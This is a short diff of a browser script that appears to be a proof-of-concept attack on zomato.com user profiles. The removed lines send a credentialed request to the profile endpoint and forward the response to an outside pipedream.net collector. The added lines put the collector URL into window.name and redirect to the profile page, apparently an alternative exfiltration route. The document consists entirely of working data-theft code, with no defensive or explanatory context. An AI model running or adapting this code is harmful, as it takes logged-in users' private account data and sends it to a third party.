@@ -1,12 +1,4 @@
 <script>
-  var xhr = new XMLHttpRequest();
-  xhr.open('GET', 'https://www.zomato.com/webroutes/getPage?page_url=/profile', true);
-  xhr.withCredentials = true;
-  xhr.onload = function() {
-    fetch('https://eomfuajl79ed6za.m.pipedream.net?data=' + encodeURIComponent(xhr.responseText));
-  };
-  xhr.onerror = function(e) {
-    fetch('https://eomfuajl79ed6za.m.pipedream.net?error=xhr_failed');
-  };
-  xhr.send();
+  window.name = 'https://eomfuajl79ed6za.m.pipedream.net';
+  window.location.href = 'https://www.zomato.com/webroutes/getPage?page_url=/profile';
 </script>
